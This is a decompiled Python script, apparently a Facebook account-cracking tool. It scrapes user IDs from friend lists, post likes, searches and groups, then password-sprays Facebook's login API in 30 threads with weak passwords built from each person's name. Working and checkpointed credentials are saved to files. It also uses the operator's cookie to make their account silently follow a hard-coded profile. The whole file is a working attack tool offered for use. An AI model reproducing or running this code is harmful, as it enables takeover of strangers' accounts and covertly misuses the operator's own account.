#DECOMPILE BY: SakuraDevOps
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import re 
import time
import json
import random
import requests
from lib import logo
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor
mbasic = 'https://mbasic.facebook.com{}'
global die,check,result, count

id = []
die = 0
chek = []
life = []
count = 0
check = 0
result = 0

g = '\x1b[1;32m'
w = '\x1b[1;37m'
b = '\x1b[1;36m'
r = '\x1b[1;31m'

def masuk():
        logo.banner()
        print('\n\n\t\t≺\033[1;36mFACEBOOK LOGIN\033[0m ≻\n\n')
        try:
                cek = open("cookies").read()
        except FileNotFoundError:
                cek = input("[\033[1;32m>\033[0m Masukan Cookie : ")
        cek = {"cookie":cek}
        ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
        if "mbasic_logout_button" in str(ismi):
                if "Apa yang Anda pikirkan sekarang" in str(ismi):
                        with open("cookies","w") as f:
                                f.write(cek["cookie"])
                else:
                        print("\033[1;31mChange the language, please wait!!")
                        try:
                                requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
                        except:
                                pass
                try:
                        # please don't remove this or change
                        ikuti = parser(requests.get(mbasic.format("/anbia.sans"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                        ses.get(mbasic.format(ikuti),cookies=cek)
                except :
                        pass 
                return cek["cookie"]
        else:
                 exit("\033[1;31mcookies invalid")
def login(username,password,cek=False):
        global die,check,result,count
        b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
        params = {
                'access_token': b,
                'format': 'JSON',
                'sdk_version': '2',
                'email': username,
                'locale': 'en_US',
                'password': password,
                'sdk': 'ios',
                'generate_session_cookies': '1',
                'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
        }
        api = 'https://b-api.facebook.com/method/auth.login'
        response = requests.get(api, params=params)
        if 'EAA' in response.text:
                print(f"\r[\033[1;32mLIFE\033[0m] {username} => {password}                       ",end="")
                print()
                result += 1
                if cek:
                        life.append(username+"|"+password)
                else:
                        with open('results-life.txt','a') as f:
                                f.write(username + '|' + password + '\n')
        elif 'www.facebook.com' in response.json()['error_msg']:
                print(f"\r[\033[1;91mCHEK\033[0m] {username} => {password}                    ",end="")
                print()
                check += 1
                if cek:
                        chek.append(username+"|"+password)
                else:
                        with open('results-check.txt','a') as f:
                                f.write(username + '|' + password + '\n')
        else:
                die += 1
        for i in list('\|/-•'):
                        print(f"\r[{i}] Life : ({str(result)}) checkpoint : ({str(check)}) die : ({str(die)})",end="")
                        time.sleep(0.2)
def getid(url):
        raw = requests.get(url,cookies=kuki).content
        getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
        for x in getuser:
                if 'profile' in x[0]:
                        id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
                elif 'friends' in x:
                        continue
                else:
                        id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
                print('\r# ' + str(len(id)) + " retrieved",end="")
        if 'Lihat Teman Lain' in str(raw):
                getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
        return id
def fromlikes(url):
        try:
                like = requests.get(url,cookies=kuki).content
                love = re.findall('href="(/ufi.*?)"',str(like))[0]
                aws = getlike(mbasic.format(love))
                return aws
        except:
                exit("\033[1;31mcant dump id ")
def getlike(react):
        like = requests.get(react,cookies=kuki).content
        ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
        for user in ids:
                if 'profile' in user[0]:
                        id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                else:
                        id.append(user[1] + "|" + user[0].split('/')[1])
                print(f'\r# {str(len(id))} retrieved',end="")
        if 'Lihat Selengkapnya' in str(like):
                getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
        return id
def bysearch(option):
        search = requests.get(option,cookies=kuki).content
        users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
        for user in users:
                if "profile" in user[0]:
                        id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                else:
                        id.append(user[1] + "|" + user[0].split("?")[0])
                print(f"\r# {str(len(id))} retrieved ",end="")
        if "Lihat Hasil Selanjutnya" in str(search):
                bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
        return id
def grubid(endpoint):
        grab = requests.get(endpoint,cookies=kuki).content
        users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
        for user in users:
                if "profile" in user[0]:
                        id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
                else:
                        id.append(user[1] + "|" + user[0])
                print(f"\r# {str(len(id))} retrieved ",end="")
        if "Lihat Selengkapnya" in str(grab):
                grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
        return id
if __name__ == '__main__':
        try:
                os.system("git pull")
                ses = requests.Session()
                kukis = masuk()
                kuki = {'cookie':kukis}
                os.system("clear")
                print('\n\033[1;97m█████████\n\033[1;97m█▄█████▄█      \033[1;96m●▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●\n\033[1;97m█\033[1;91m▼▼▼▼▼ \033[1;97m- _ --_--\033[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n\033[1;97m█ \033[1;97m \033[1;97m_-_-- -_ --__\033[1;92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n\033[1;97m█\033[1;91m▲▲▲▲▲\033[1;97m--  - _ --\033[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;93mDark ELITE v2.3\n\033[1;97m█████████      \033[1;96m●▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●\n\033[1;97m ██ ██\n\033[1;97m╔════════════════════════════════════════╗\n\033[1;97m║\033[1;93m* \033[1;97mAuthor  \033[1;91m: \033[1;96mMR.DEBO \033[1;97m                    ║\n\033[1;97m║\033[1;93m* \033[1;97mGithub  \033[1;91m: \033[1;96mhttps://github.com/MrDebo\033[1;97m   ║\n\033[1;97m║\033[1;93m* \033[1;97mFB      \033[1;91m: \033[1;92m\033[4mhttps://fb.me/mas.debo.02\033[0m   \033[1;97m║\n\033[1;97m║\033[1;93m* \033[1;97mVersion \033[1;91m: \033[1;92m\033[4m2.3\033[0m                         \033[1;97m║\n\033[1;97m╚════════════════════════════════════════╝')
                print('\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Crack From List Friends')
                print('\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Crack From Likes ')
                print('\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Crack From Search Name')
                print('\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Crack From Group ')
                print('\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Crack Friend Of Friend')
                print('\033[1;97m║--\033[1;91m> \033[1;91m6.\033[1;97m Result Check')
                tanya = input('\033[1;97m╚═\033[1;91m>>> \033[1;97m ')
                if tanya =="":
                        exit("\033[1;36m] [!]Dont be empty")
                elif tanya == '1':
                        url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                        username = getid(mbasic.format(url["href"]))
                elif tanya == '2':
                        username = input("\033[1;32mMasukan Url \033[1;31m: \033[1;37m")
                        if username == "":
                                exit("\033[1;31mDont be empty")
                        elif 'www.facebook' in username:
                               username = username.replace('www.facebook','mbasic.facebook')
                        elif 'm.facebook.com' in username:
                               username = username.replace('m.facebook.com','mbasic.facebook.com')
                        username = fromlikes(username) 
                elif tanya == '3':
                        zet = input("\033[1;36mQuery \033[1;31m:\033[1;37m ")
                        username = bysearch(mbasic.format('/search/people/?q='+zet))
                        if len(username) == 0:
                                exit("\033[1;31mno result")
                elif tanya == '4':
                        print("\033[1;32mCan only take 100 IDs ")
                        grab = input("\033[1;32mMasukan ID Group\033[1;31m : \033[1;37m")
                        username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                        if len(username) == 0:
                                exit("\033[1;31mID wrong")
                elif tanya == '5':
                        zet = input("\033[1;32mMasukan Username/Id\033[1;31m : \033[1;37m")
                        if zet.isdigit():
                                user = "/profile.php?id=" + zet
                        else:
                                user = "/" + zet
                        try:
                                user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
                                username = getid(mbasic.format(user))
                        except TypeError:
                                exit("\033[1;31muser not found ")
                elif tanya == '6':
                        try:
                                file1 = open("results-check.txt").read()
                                file2 = open("results-life.txt").read()
                                a = file1 + file2
                                final = a.strip().split("\n")
                                final = set(final)
                                print(f"# {str(len(final))} accounts to check ")
                                with ThreadPoolExecutor(max_workers=10) as ex:
                                        for user in final:
                                                a = user.split("|")
                                                ex.submit(login,(a[0]),(a[1]),(True))
                                os.remove("results-check.txt")
                                os.remove("results-life.txt")
                                for x in life:
                                        with open('results-life.txt','a') as f:
                                                f.write(x+'\n')
                                for x in chek:
                                        with open('results-check.txt','a') as f:
                                                f.write(x+"\n")
                                
                                print("\n# Done")
                                print("\033[1;33msaved to results-check.txt results-life.txt")
                                exit()
                        except FileNotFoundError:
                                exit("#\033[1;31myou not have a results")
                else:
                        exit("\033[1;31mWrong Choice")
                print()
                expass = input("[\033[1;32m>\033[0m] Extra Password : ")
                print("# result will be saved in results-life.txt and results-check.txt")
                with ThreadPoolExecutor(max_workers=30) as ex:
                        for user in username:
                                users = user.split('|')
                                ss = users[0].split(' ')
                                for x in ss:
                                        listpass = [
                                                str(x) + '123',
                                                str(x) + '12345',
                                                str(x) + 'gamers',
                                                str(x) + 'gaming',
							 'sayang',
							 'freefire',
                                                ]
                                        listpass.append(expass)
                                        for passw in set(listpass):
                                                ex.submit(login,(users[1]),(passw))
                if check != 0 or result != 0:
                        print("\n[\033[1;32m✔\033[0m Done. file saved in : ")
                        print("        - life : results-life.txt")
                        print("        - checkpoint : results-check.txt")
                        exit("# thanks for using this tools")
                else:
                        print("\n# Done")
                        exit("# no result")
        except (KeyboardInterrupt,EOFError):
                exit()
        except requests.exceptions.ConnectionError:
                exit("# Connection error")


